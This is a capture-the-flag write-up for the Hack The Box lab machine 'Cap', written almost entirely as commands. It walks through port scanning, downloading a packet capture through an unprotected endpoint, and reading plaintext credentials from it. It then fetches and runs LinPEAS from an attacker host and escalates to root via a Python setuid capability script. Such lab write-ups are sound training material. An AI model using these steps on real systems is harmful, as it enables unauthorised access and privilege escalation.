HTB Cap Write-Up
===================

1. Reconnaissance
-----------------
sudo nmap -Pn -A 10.10.10.245

Services found:
- FTP (21)
- SSH (22)
- HTTP (80)

2. Web Enumeration
------------------
echo "10.10.10.245 cap.htb" | sudo tee -a /etc/hosts

curl -I http://cap.htb

3. Endpoint Discovery
---------------------
curl -I http://cap.htb/data
curl -I http://cap.htb/capture/0
curl -I http://cap.htb/download/0

Functional endpoint: /download/<id>

4. Download PCAP
----------------
sudo ifconfig utun6 mtu 1200
wget http://10.10.10.245/download/0 -O 0.pcap

5. Analyse PCAP
---------------
tcpdump -r 0.pcap

Credentials:
USER nathan
PASS Buck3tH4TF0RM3!

6. SSH Access
-------------
ssh nathan@10.10.10.245
cat user.txt

7. Privilege Escalation
-----------------------
Upload and run LinPEAS:

wget http://<ip>/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

Finding:
/usr/bin/python3.8 = cap_setuid+ep

8. Exploit Python Capabilities
------------------------------
cat tq.py:

import os
os.setuid(0)
os.system("/bin/bash")

Run:
python3 tq.py

9. Root Flag
------------
cat /root/root.txt
